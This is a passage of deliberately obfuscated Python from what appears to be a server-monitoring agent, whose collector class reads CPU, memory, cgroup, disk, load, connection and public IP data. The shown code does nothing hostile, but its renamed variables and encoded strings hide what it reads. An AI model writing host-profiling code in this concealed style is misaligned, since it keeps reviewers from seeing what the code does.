        for O0_var_154 in items:
            yield O0_var_154

class SystemInfoCollector:
    codecs.decode('\\u7cfb\\u7edf\\u4fe1\\u606f\\u6536\\u96c6\\u5668\\u0020\\u0028\\u5df2\\u4fee\\u590d\\u8de8\\u8bf7\\u6c42\\u5b9e\\u4f8b\\u5316\\u751f\\u547d\\u5468\\u671f\\u5bfc\\u81f4\\u7684\\u0020\\u0030\\u0025\\u0020\\u72b6\\u6001\\u0020\\u0042\\u0075\\u0067\\u0029', 'unicode_escape')
    _last_cpu_times = None
    _last_network_stats = {codecs.decode('\\u0072\\u0078', 'unicode_escape'): 0, codecs.decode('\\u0074\\u0078', 'unicode_escape'): 0}
    _total_network_up = 0
    _total_network_down = 0
    _last_network_time = time.time()
    _cpu_init_lock = asyncio.Lock()

    def __init__(self):
        pass

    async def get_basic_info(self) -> Dict[str, Any]:
        O0_var_155 = self._get_linux_distribution()
        O0_var_156, O0_var_157 = await asyncio.gather(self._get_public_ip_v4(), self._get_public_ip_v6(), return_exceptions=True)
        O0_var_156 = O0_var_156 if not isinstance(O0_var_156, Exception) else None
        O0_var_157 = O0_var_157 if not isinstance(O0_var_157, Exception) else None
        if isinstance(O0_var_156, Exception):
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0020\\u0049\\u0050\\u0076\\u0034\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(O0_var_156), 11)
            O0_var_156 = None
        if isinstance(O0_var_157, Exception):
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0020\\u0049\\u0050\\u0076\\u0036\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(O0_var_157), 11)
            O0_var_157 = None
        O0_var_158 = str(O0_var_155['name']) + codecs.decode('\\u0020', 'unicode_escape') + str(O0_var_155['version']) if O0_var_155[codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')] != codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape') else platform.system()
        O0_var_159 = {codecs.decode('\\u0061\\u0072\\u0063\\u0068', 'unicode_escape'): platform.machine(), codecs.decode('\\u0063\\u0070\\u0075\\u005f\\u0063\\u006f\\u0072\\u0065\\u0073', 'unicode_escape'): psutil.cpu_count(), codecs.decode('\\u0063\\u0070\\u0075\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): self._get_cpu_name(), codecs.decode('\\u0064\\u0069\\u0073\\u006b\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): await self._get_disk_total(), codecs.decode('\\u0067\\u0070\\u0075\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u0069\\u0070\\u0076\\u0034', 'unicode_escape'): O0_var_156, codecs.decode('\\u0069\\u0070\\u0076\\u0036', 'unicode_escape'): O0_var_157, codecs.decode('\\u006d\\u0065\\u006d\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): self._get_container_mem_limit(), codecs.decode('\\u006f\\u0073', 'unicode_escape'): O0_var_158, codecs.decode('\\u006b\\u0065\\u0072\\u006e\\u0065\\u006c\\u005f\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): platform.release(), codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): psutil.swap_memory().total, codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): Config.AGENT_VERSION, codecs.decode('\\u0076\\u0069\\u0072\\u0074\\u0075\\u0061\\u006c\\u0069\\u007a\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'): self._get_virtualization()}
        Logger.debug(codecs.decode('\\u57fa\\u7840\\u4fe1\\u606f\\u6570\\u636e\\u003a\\u0020', 'unicode_escape') + str(json.dumps(O0_var_159, indent=2)), 11)
        return O0_var_159

    async def get_realtime_info(self) -> Dict[str, Any]:
        O0_var_160 = await self._get_cpu_usage()
        O0_var_161 = await self._get_network_stats()
        O0_var_162 = await self._get_memory_info()
        O0_var_163 = await self._get_disk_info()
        try:
            O0_var_164 = len(psutil.pids())
        except Exception as e:
            O0_var_164 = 0
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u8fdb\\u7a0b\\u6570\\u5931\\u8d25\\uff1a', 'unicode_escape') + str(e), 11)
        O0_var_165 = {codecs.decode('\\u0063\\u0070\\u0075', 'unicode_escape'): {codecs.decode('\\u0075\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): O0_var_160}, codecs.decode('\\u0072\\u0061\\u006d', 'unicode_escape'): {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_162[codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape')], codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_162[codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape')]}, codecs.decode('\\u0073\\u0077\\u0061\\u0070', 'unicode_escape'): {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_162[codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape')], codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_162[codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape')]}, codecs.decode('\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'): {codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0031', 'unicode_escape'): round(psutil.getloadavg()[0] if hasattr(psutil, codecs.decode('\\u0067\\u0065\\u0074\\u006c\\u006f\\u0061\\u0064\\u0061\\u0076\\u0067', 'unicode_escape')) and psutil.getloadavg() else 0, 2), codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0035', 'unicode_escape'): round(psutil.getloadavg()[1] if hasattr(psutil, codecs.decode('\\u0067\\u0065\\u0074\\u006c\\u006f\\u0061\\u0064\\u0061\\u0076\\u0067', 'unicode_escape')) and psutil.getloadavg() else 0, 2), codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0031\\u0035', 'unicode_escape'): round(psutil.getloadavg()[2] if hasattr(psutil, codecs.decode('\\u0067\\u0065\\u0074\\u006c\\u006f\\u0061\\u0064\\u0061\\u0076\\u0067', 'unicode_escape')) and psutil.getloadavg() else 0, 2)}, codecs.decode('\\u0064\\u0069\\u0073\\u006b', 'unicode_escape'): {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_163[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape')], codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_163[codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape')]}, codecs.decode('\\u006e\\u0065\\u0074\\u0077\\u006f\\u0072\\u006b', 'unicode_escape'): {codecs.decode('\\u0075\\u0070', 'unicode_escape'): O0_var_161[codecs.decode('\\u0075\\u0070', 'unicode_escape')], codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): O0_var_161[codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape')], codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0055\\u0070', 'unicode_escape'): O0_var_161[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0075\\u0070', 'unicode_escape')], codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0044\\u006f\\u0077\\u006e', 'unicode_escape'): O0_var_161[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0064\\u006f\\u0077\\u006e', 'unicode_escape')]}, codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0073', 'unicode_escape'): {codecs.decode('\\u0074\\u0063\\u0070', 'unicode_escape'): await self._get_tcp_connections(), codecs.decode('\\u0075\\u0064\\u0070', 'unicode_escape'): await self._get_udp_connections()}, codecs.decode('\\u0075\\u0070\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'): int(time.time() - psutil.boot_time()), codecs.decode('\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_164, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('', 'unicode_escape')}
        Logger.debug(codecs.decode('\\u5b9e\\u65f6\\u76d1\\u63a7\\u6570\\u636e\\u003a\\u0020', 'unicode_escape') + str(json.dumps(O0_var_165, indent=2)), 12)
        return O0_var_165

    def _get_cpu_name(self) -> str:
        try:
            if platform.system() == codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073', 'unicode_escape'):
                import winreg
                O0_var_166 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, codecs.decode('\\u0048\\u0041\\u0052\\u0044\\u0057\\u0041\\u0052\\u0045\\u005c\\u0044\\u0045\\u0053\\u0043\\u0052\\u0049\\u0050\\u0054\\u0049\\u004f\\u004e\\u005c\\u0053\\u0079\\u0073\\u0074\\u0065\\u006d\\u005c\\u0043\\u0065\\u006e\\u0074\\u0072\\u0061\\u006c\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u005c\\u0030', 'unicode_escape'))
                O0_var_167 = winreg.QueryValueEx(O0_var_166, codecs.decode('\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u004e\\u0061\\u006d\\u0065\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067', 'unicode_escape'))[0]
                winreg.CloseKey(O0_var_166)
                return O0_var_167.strip()
            else:
                with open(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0063\\u0070\\u0075\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_168:
                    for O0_var_169 in O0_var_168:
                        if O0_var_169.strip().startswith(codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u006c\\u0020\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')):
                            return O0_var_169.split(codecs.decode('\\u003a', 'unicode_escape'))[1].strip()
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0043\\u0050\\u0055\\u540d\\u79f0\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 11)
        return codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e\\u0020\\u0043\\u0050\\u0055', 'unicode_escape')

    async def _get_cpu_usage(self) -> float:
        try:
            O0_var_170 = psutil.cpu_times()
            async with SystemInfoCollector._cpu_init_lock:
                if SystemInfoCollector._last_cpu_times is None:
                    SystemInfoCollector._last_cpu_times = O0_var_170
                    await asyncio.sleep(0.1)
                    O0_var_170 = psutil.cpu_times()
                O0_var_171 = SystemInfoCollector._last_cpu_times
                SystemInfoCollector._last_cpu_times = O0_var_170
            O0_var_172 = sum(O0_var_170) - sum(O0_var_171)
            O0_var_173 = O0_var_170.idle - O0_var_171.idle
            if O0_var_172 <= 0:
                return 0.0
            O0_var_174 = (O0_var_172 - O0_var_173) / O0_var_172 * 100
            return round(max(0.0, min(100.0, O0_var_174)), 2)
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0043\\u0050\\u0055\\u4f7f\\u7528\\u7387\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 12)
            return 0.0

    def _get_container_mem_limit(self) -> int:
        try:
            if os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u006d\\u0061\\u0078', 'unicode_escape')):
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u006d\\u0061\\u0078', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_175:
                    O0_var_176 = O0_var_175.read().strip()
                    if O0_var_176 != codecs.decode('\\u006d\\u0061\\u0078', 'unicode_escape'):
                        return int(O0_var_176)
        except (OSError, ValueError):
            pass
        try:
            if os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u006c\\u0069\\u006d\\u0069\\u0074\\u005f\\u0069\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')):
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u006c\\u0069\\u006d\\u0069\\u0074\\u005f\\u0069\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_175:
                    O0_var_176 = int(O0_var_175.read().strip())
                    if O0_var_176 < 9223372036854771712:
                        return O0_var_176
        except (OSError, ValueError):
            pass
        return psutil.virtual_memory().total

    def _get_container_mem_usage(self) -> int:
        if os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0063\\u0075\\u0072\\u0072\\u0065\\u006e\\u0074', 'unicode_escape')) and os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0073\\u0074\\u0061\\u0074', 'unicode_escape')):
            try:
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0063\\u0075\\u0072\\u0072\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_177:
                    O0_var_178 = int(O0_var_177.read().strip())
                O0_var_179 = 0
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0073\\u0074\\u0061\\u0074', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_177:
                    for O0_var_180 in O0_var_177:
                        O0_var_181 = O0_var_180.strip().split()
                        if len(O0_var_181) == 2 and O0_var_181[0] == codecs.decode('\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'):
                            O0_var_179 = int(O0_var_181[1])
                            break
                return max(0, O0_var_178 - O0_var_179)
            except (OSError, ValueError):
                pass
        if os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0075\\u0073\\u0061\\u0067\\u0065\\u005f\\u0069\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')) and os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0073\\u0074\\u0061\\u0074', 'unicode_escape')):
            try:
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0075\\u0073\\u0061\\u0067\\u0065\\u005f\\u0069\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_177:
                    O0_var_178 = int(O0_var_177.read().strip())
                O0_var_182 = 0
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0073\\u0074\\u0061\\u0074', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_177:
                    for O0_var_180 in O0_var_177:
                        O0_var_181 = O0_var_180.strip().split()
                        if len(O0_var_181) == 2 and O0_var_181[0] == codecs.decode('\\u0063\\u0061\\u0063\\u0068\\u0065', 'unicode_escape'):
                            O0_var_182 = int(O0_var_181[1])
                            break
                return max(0, O0_var_178 - O0_var_182)
            except (OSError, ValueError):
                pass
        return psutil.virtual_memory().used

    async def _get_memory_info(self) -> Dict[str, int]:
        try:
            O0_var_183 = self._get_container_mem_limit()
            O0_var_184 = self._get_container_mem_usage()
            O0_var_185 = psutil.swap_memory()
            return {codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_183, codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_184, codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_185.total, codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_185.used}
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u5185\\u5b58\\u4fe1\\u606f\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 12)
            return {codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0, codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0}

    def _get_physical_disk_device(self, O0_var_186: str) -> Optional[str]:
        if platform.system() != codecs.decode('\\u004c\\u0069\\u006e\\u0075\\u0078', 'unicode_escape'):
            return O0_var_186
        import re
        O0_var_187 = O0_var_186.replace(codecs.decode('\\u002f\\u0064\\u0065\\u0076\\u002f', 'unicode_escape'), codecs.decode('', 'unicode_escape'))
        if not O0_var_187:
            return None
        if re.match(codecs.decode('\\u005e\\u005b\\u0061\\u002d\\u007a\\u0041\\u002d\\u005a\\u0030\\u002d\\u0039\\u005c\\u002e\\u005c\\u002d\\u005f\\u005d\\u002b\\u003a', 'unicode_escape'), O0_var_187) or O0_var_187.startswith(codecs.decode('\\u002f\\u002f', 'unicode_escape')):
            return O0_var_186
        O0_var_188 = [codecs.decode('\\u005e\\u0028\\u006d\\u0064\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u0029\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u0073\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0029\\u005c\\u0064\\u002a\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u0076\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0029\\u005c\\u0064\\u002a\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u0078\\u0076\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0029\\u005c\\u0064\\u002a\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u006d\\u006d\\u0063\\u0062\\u006c\\u006b\\u005c\\u0064\\u002b\\u0029\\u0070\\u003f\\u005c\\u0064\\u002a\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u006e\\u0076\\u006d\\u0065\\u005c\\u0064\\u002b\\u006e\\u005c\\u0064\\u002b\\u0029\\u0070\\u003f\\u005c\\u0064\\u002a\\u0024', 'unicode_escape')]
        for O0_var_189 in O0_var_188:
            O0_var_190 = re.match(O0_var_189, O0_var_187)
            if O0_var_190:
                return codecs.decode('\\u002f\\u0064\\u0065\\u0076\\u002f', 'unicode_escape') + str(O0_var_190.group(1))
        if not re.search(codecs.decode('\\u005c\\u0064', 'unicode_escape'), O0_var_187):
            return O0_var_186
        O0_var_191 = codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0062\\u006c\\u006f\\u0063\\u006b\\u002f', 'unicode_escape') + str(O0_var_187)
        if os.path.exists(O0_var_191):
            O0_var_192 = os.path.realpath(os.path.dirname(O0_var_191))
            O0_var_193 = os.path.realpath(O0_var_191)
            if not os.path.isdir(O0_var_193):
                O0_var_194 = os.path.dirname(O0_var_192)
                if O0_var_194.endswith(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0062\\u006c\\u006f\\u0063\\u006b', 'unicode_escape')):
                    O0_var_195 = os.path.basename(O0_var_192)
                    if self._is_physical_disk(codecs.decode('\\u002f\\u0064\\u0065\\u0076\\u002f', 'unicode_escape') + str(O0_var_195)):
                        return codecs.decode('\\u002f\\u0064\\u0065\\u0076\\u002f', 'unicode_escape') + str(O0_var_195)
        return None

    def _get_container_disk_info(self) -> Dict[str, int]:
        try:
            O0_var_196 = psutil.disk_usage(codecs.decode('\\u002f', 'unicode_escape'))
            return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): int(O0_var_196.total), codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): int(O0_var_196.used)}
        except Exception as e:
            Logger.debug(codecs.decode('\\u005b\\u5bb9\\u5668\\u6a21\\u5f0f\\u005d\\u0020\\u83b7\\u53d6\\u78c1\\u76d8\\u4fe1\\u606f\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 15)
            return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0}

    async def _get_host_disk_info(self) -> Dict[str, int]:
        try:
            O0_var_197 = 0
            O0_var_198 = 0
            O0_var_199 = set()
            O0_var_200 = psutil.disk_partitions(all=True)
            for O0_var_201 in O0_var_200:
                O0_var_202 = O0_var_201.device
                O0_var_203 = O0_var_201.mountpoint
                O0_var_204 = O0_var_201.fstype
                if O0_var_204 in {codecs.decode('\\u0074\\u006d\\u0070\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u0076\\u0074\\u006d\\u0070\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u006f\\u0076\\u0065\\u0072\\u006c\\u0061\\u0079', 'unicode_escape'), codecs.decode('\\u0073\\u0071\\u0075\\u0061\\u0073\\u0068\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0070\\u0072\\u006f\\u0063', 'unicode_escape'), codecs.decode('\\u0073\\u0079\\u0073\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u0062\\u0075\\u0067\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070', 'unicode_escape'), codecs.decode('\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u0032', 'unicode_escape'), codecs.decode('\\u0070\\u0073\\u0074\\u006f\\u0072\\u0065', 'unicode_escape'), codecs.decode('\\u0062\\u0070\\u0066', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0061\\u0063\\u0065\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0073\\u0065\\u0063\\u0075\\u0072\\u0069\\u0074\\u0079\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0065\\u0066\\u0069\\u0076\\u0061\\u0072\\u0066\\u0073', 'unicode_escape')}:
                    continue
                O0_var_205 = self._get_physical_disk_device(O0_var_202)
                if not O0_var_205 or O0_var_205 in O0_var_199:
                    continue
                if not self._is_physical_disk(O0_var_205):
                    continue
                try:
                    O0_var_206 = psutil.disk_usage(O0_var_203)
                    O0_var_197 += O0_var_206.total
                    O0_var_198 += O0_var_206.used
                    O0_var_199.add(O0_var_205)
                except (PermissionError, OSError):
                    continue
            return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_197, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_198}
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u78c1\\u76d8\\u4fe1\\u606f\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 15)
            return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0}

    async def _get_disk_info(self) -> Dict[str, int]:
        if self._get_virtualization() in [codecs.decode('\\u0044\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape'), codecs.decode('\\u004c\\u0078\\u0063', 'unicode_escape'), codecs.decode('\\u0050\\u006f\\u0064\\u006d\\u0061\\u006e', 'unicode_escape')]:
            return self._get_container_disk_info()
        return await self._get_host_disk_info()

    async def _get_disk_total(self) -> int:
        O0_var_207 = await self._get_disk_info()
        return O0_var_207[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape')]

    def _is_physical_disk(self, O0_var_208: str) -> bool:
        if platform.system() == codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073', 'unicode_escape'):
            return any((O0_var_208.lower().startswith(O0_var_209) for O0_var_209 in [codecs.decode('\\u0063\\u003a', 'unicode_escape'), codecs.decode('\\u0064\\u003a', 'unicode_escape'), codecs.decode('\\u0065\\u003a', 'unicode_escape'), codecs.decode('\\u0066\\u003a', 'unicode_escape'), codecs.decode('\\u0067\\u003a', 'unicode_escape'), codecs.decode('\\u0068\\u003a', 'unicode_escape')]))
        import re
        if re.match(codecs.decode('\\u005e\\u005b\\u0061\\u002d\\u007a\\u0041\\u002d\\u005a\\u0030\\u002d\\u0039\\u005c\\u002e\\u005c\\u002d\\u005f\\u005d\\u002b\\u003a', 'unicode_escape'), O0_var_208) or O0_var_208.startswith(codecs.decode('\\u002f\\u002f', 'unicode_escape')):
            return True
        O0_var_210 = [codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u0073\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u0076\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u0078\\u0076\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u006e\\u0076\\u006d\\u0065\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u006e\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u006d\\u006d\\u0063\\u0062\\u006c\\u006b\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u006d\\u0064\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u007a\\u0072\\u006f\\u006f\\u0074\\u002f\\u002e\\u002a\\u0024', 'unicode_escape')]
        return any((re.match(O0_var_211, O0_var_208) for O0_var_211 in O0_var_210))

    async def _get_network_stats(self) -> Dict[str, int]:
        try:
            O0_var_212 = psutil.net_io_counters(pernic=True)
            O0_var_213 = time.time()
            O0_var_214 = 0
            O0_var_215 = 0
